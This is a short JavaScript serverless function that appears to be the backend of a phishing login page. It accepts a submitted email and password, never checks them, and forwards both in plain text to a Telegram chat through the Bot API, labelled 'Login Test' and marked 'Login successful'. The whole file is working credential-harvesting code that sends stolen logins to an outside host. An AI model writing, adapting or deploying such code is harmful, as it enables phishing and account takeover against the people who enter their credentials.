exports.handler = async function (event) {
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: "Method not allowed" })
    };
  }

  try {
    const data = JSON.parse(event.body || "{}");
    const email = String(data.email || "").trim();
    const password = String(data.password || "");
    
    if (!email || !password) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: "Email is required." })
      };
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      return {
        statusCode: 500,
        body: JSON.stringify({ error: "Telegram configuration is missing." })
      };
    }

    const text =
      "Login Test\n\n" +
      "Email: " + email + "\n" +
      "Password: " + password + "\n" +
      "Status: Login successful";

    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: text
        })
      }
    );

    const result = await response.json();

    if (!response.ok || !result.ok) {
      return {
        statusCode: 502,
        body: JSON.stringify({
          error: "Telegram message could not be sent."
        })
      };
    }

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true })
    };

  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: "Server error." })
    };
  }
};
